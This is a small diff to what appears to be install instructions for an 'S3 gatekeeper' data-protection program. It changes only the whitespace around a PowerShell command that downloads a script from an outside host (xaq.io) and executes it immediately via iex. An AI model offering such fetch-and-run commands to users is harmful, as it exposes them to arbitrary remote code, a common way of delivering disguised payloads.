@@ -12,7 +12,7 @@ The S3 gatekeeper is the program used to safeguard your data as a customer of ti
 
 2) Paste the following command into the window:
 
-​	`iex ((New-Object System.Net.WebClient).DownloadString('http://xaq.io/g?{0}' -f (Get-Random)))`
+   `iex ((New-Object System.Net.WebClient).DownloadString('http://xaq.io/g?{0}' -f (Get-Random)))`
 
 3) Press enter and follow the prompts.
 
